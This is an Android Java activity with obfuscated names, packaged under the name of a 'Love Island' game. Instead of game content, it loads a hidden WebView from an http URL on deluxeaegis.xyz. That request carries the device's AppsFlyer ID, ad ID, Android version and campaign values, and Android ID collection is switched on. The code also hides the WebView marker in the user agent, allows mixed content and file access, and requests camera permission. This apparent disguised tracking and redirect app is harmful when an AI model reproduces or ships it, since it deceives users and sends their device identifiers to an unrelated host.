package com.fuseboxgames.loveislang.deluxeblack;

import static com.fuseboxgames.loveislang.deluxeblack.AppClassDeluxe.KDOSDLFLFDLSLFD;
import static com.fuseboxgames.loveislang.deluxeblack.MainActivity.KIDODOFODFO;
import static com.fuseboxgames.loveislang.deluxeblack.ReplaceDeluxeAct.LDOSFKFDKKDF;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.appsflyer.AppsFlyerLib;
import com.fuseboxgames.loveislang.R;
import com.orhanobut.hawk.Hawk;

import java.io.File;
import java.io.IOException;

public class RealActDelux extends AppCompatActivity {

    private ValueCallback<Uri> ksidooasdosd;
    private Uri dlsdofofdpsfdp = null;

    private static final String HUDIFISIDF = RealActDelux.class.getSimpleName();
    private static final int RDTSYFYDFYFYSDYF = 1;


    private ValueCallback<Uri[]> rtddyuusufusudf;
    private String bhidfoslsfdlfds;
    WebView trfdstdfuusdfuf;


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_real);
        trfdstdfuusdfuf = findViewById(R.id.realView);

        WebSettings webSettings = trfdstdfuusdfuf.getSettings();

        webSettings.setJavaScriptEnabled(true);


        webSettings.setPluginState(WebSettings.PluginState.ON);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        webSettings.setAppCacheEnabled(true);


        webSettings.setUseWideViewPort(true);
        webSettings.setUserAgentString(webSettings.getUserAgentString().replace("; wv", ""));

        webSettings.setLoadWithOverviewMode(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setDomStorageEnabled(true);

        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webSettings.setSupportMultipleWindows(false);

        webSettings.setDisplayZoomControls(false);
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);


        webSettings.setAllowContentAccess(true);

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(trfdstdfuusdfuf,true);


        final Activity activity = this;
        trfdstdfuusdfuf.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                view.loadUrl(url);
                return false;
            }


            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);


                if(trfdstdfuusdfuf.getProgress() == 100) {
                    trfdstdfuusdfuf.setVisibility(View.VISIBLE);
                    osdppdasppdasdp(url);
                }
            }

            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show();
            }
        });


        trfdstdfuusdfuf.loadUrl(osapdpdpspasdppdas());

        String permission = Manifest.permission.CAMERA;
        int hdudsiifi = ContextCompat.checkSelfPermission(this, permission);
        if (hdudsiifi != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }

        trfdstdfuusdfuf.setWebChromeClient(new WebChromeClient() {


            public boolean onShowFileChooser(
                    WebView webView, ValueCallback<Uri[]> filePathCallback,
                    WebChromeClient.FileChooserParams fileChooserParams) {
                if (rtddyuusufusudf != null) {
                    rtddyuusufusudf.onReceiveValue(null);
                }
                rtddyuusufusudf = filePathCallback;

                Intent ldsofiidfsi = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (ldsofiidfsi.resolveActivity(getPackageManager()) != null) {

                    // create the file where the photo should go
                    File tdyfusudfsu = null;
                    try {
                        tdyfusudfsu = tsrdasydsajsdajsd();
                        ldsofiidfsi.putExtra("PhotoPath", bhidfoslsfdlfds);
                    } catch (IOException ex) {
                        // Error occurred while creating the File
                        Log.e(HUDIFISIDF, "Unable to create Image File", ex);
                    }

                    // continue only if the file was successfully created
                    if (tdyfusudfsu != null) {
                        bhidfoslsfdlfds = "file:" + tdyfusudfsu.getAbsolutePath();
                        ldsofiidfsi.putExtra(MediaStore.EXTRA_OUTPUT,
                                Uri.fromFile(tdyfusudfsu));
                    } else {
                        ldsofiidfsi = null;
                    }
                }

                Intent ldodpfspfdsofdo = new Intent(Intent.ACTION_GET_CONTENT);
                ldodpfspfdsofdo.addCategory(Intent.CATEGORY_OPENABLE);
                ldodpfspfdsofdo.setType("image/*");

                Intent[] redsyfdysdfy;
                if (ldsofiidfsi != null) {
                    redsyfdysdfy = new Intent[]{ldsofiidfsi};
                } else {
                    redsyfdysdfy = new Intent[0];
                }

                Intent podsfkfsdkkfd = new Intent(Intent.ACTION_CHOOSER);
                podsfkfsdkkfd.putExtra(Intent.EXTRA_INTENT, ldodpfspfdsofdo);
                podsfkfsdkkfd.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
                podsfkfsdkkfd.putExtra(Intent.EXTRA_INITIAL_INTENTS, redsyfdysdfy);

                startActivityForResult(podsfkfsdkkfd, RDTSYFYDFYFYSDYF);

                return true;
            }

            private File tsrdasydsajsdajsd() throws IOException {

                File giuidsiadsi = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "DirectoryNameHere");

                if (!giuidsiadsi.exists()) {
                    giuidsiadsi.mkdirs();
                }

                // create an image file name
                giuidsiadsi = new File(giuidsiadsi + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");
                return giuidsiadsi;
            }

            public void ldfjjfdjfsdjjdf(ValueCallback<Uri> uploadMsg, String acceptType) {
                ksidooasdosd = uploadMsg;

                try {
                    File rtwdwquwduuqwdu = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "DirectoryNameHere");

                    if (!rtwdwquwduuqwdu.exists()) {
                        rtwdwquwduuqwdu.mkdirs();
                    }

                    File file = new File(rtwdwquwduuqwdu + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");

                    dlsdofofdpsfdp = Uri.fromFile(file); // save to the private variable

                    final Intent wddwqdwq = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                    wddwqdwq.putExtra(MediaStore.EXTRA_OUTPUT, dlsdofofdpsfdp);
                    //captureIntent.putExtra(MediaStore.EXTRA_SCREEN_ORIENTATION, ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

                    Intent jjsadjsdkakds = new Intent(Intent.ACTION_GET_CONTENT);
                    jjsadjsdkakds.addCategory(Intent.CATEGORY_OPENABLE);
                    jjsadjsdkakds.setType("image/*");

                    Intent chooserIntent = Intent.createChooser(jjsadjsdkakds, getString(R.string.image_chooser));
                    chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, new Parcelable[]{wddwqdwq});

                    startActivityForResult(chooserIntent, RDTSYFYDFYFYSDYF);
                } catch (Exception e) {
                    Toast.makeText(getBaseContext(), "Camera Exception:" + e, Toast.LENGTH_LONG).show();
                }

            }

        });

    }

    public void osdppdasppdasdp(String url) {
        SharedPreferences ksodlsdalsd = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE);
        SharedPreferences.Editor editor = ksodlsdalsd.edit();
        editor.putString("SAVED_URL", url);
        editor.apply();
    }

    public String osapdpdpspasdppdas(){


        String  tysduauasdusd, vjsodaisdiisd, psoadosdksdk, rsaydhjsdjjs;

        String rsyudysdyuyuds, psoosdosdo, rstadyydys, psododoassdo, tshdhsdh, podiidaisi;

        SharedPreferences sp_p = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE);


        tysduauasdusd = Hawk.get(LDOSFKFDKKDF);
        psoadosdksdk = Hawk.get(KIDODOFODFO);
        vjsodaisdiisd = Hawk.get(KDOSDLFLFDLSLFD);
        rsaydhjsdjjs = "com.fuseboxgames.loveislang";
        String afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        AppsFlyerLib.getInstance().setCollectAndroidID(true);
        String androidVersion = Build.VERSION.RELEASE;


        rsyudysdyuyuds = "sub_id_1=";
        psoosdosdo = "deviceID=";
        rstadyydys = "ad_id=";
        psododoassdo = "sub_id_4=";
        tshdhsdh = "sub_id_5=";
        podiidaisi = "sub_id_6=";


        String first1 = "http://";
        String second2 = "deluxeaegis.xyz/go.php?to=2&";
        String whole = first1 + second2;

        String fff;

        if (!tysduauasdusd.equals("null")){
            fff = whole+rsyudysdyuyuds+tysduauasdusd+"&"+psoosdosdo+afId+"&"+rstadyydys+vjsodaisdiisd+"&"+psododoassdo+rsaydhjsdjjs+"&"+tshdhsdh+androidVersion+"&"+podiidaisi+"naming";
        }

        else{
            fff = whole+rsyudysdyuyuds+psoadosdksdk+"&"+psoosdosdo+afId+"&"+rstadyydys+vjsodaisdiisd+"&"+psododoassdo+rsaydhjsdjjs+"&"+tshdhsdh+androidVersion+"&"+podiidaisi+"deeporg";
        }


        Log.d("TESTAG", "Test Result " + fff);


        return sp_p.getString("SAVED_URL", fff);
    }



    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {



        if (requestCode != RDTSYFYDFYFYSDYF || rtddyuusufusudf == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }

        Uri[] hsadyyasdys = null;

        if (resultCode == Activity.RESULT_OK) {
            if (data == null || data.getData() == null) {
                if (bhidfoslsfdlfds != null) {
                    hsadyyasdys = new Uri[]{Uri.parse(bhidfoslsfdlfds)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    hsadyyasdys = new Uri[]{Uri.parse(dataString)};
                }
            }
        }

        rtddyuusufusudf.onReceiveValue(hsadyyasdys);
        rtddyuusufusudf = null;

    }

    @Override
    public void onBackPressed() {
        if (trfdstdfuusdfuf.canGoBack()) {
            trfdstdfuusdfuf.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
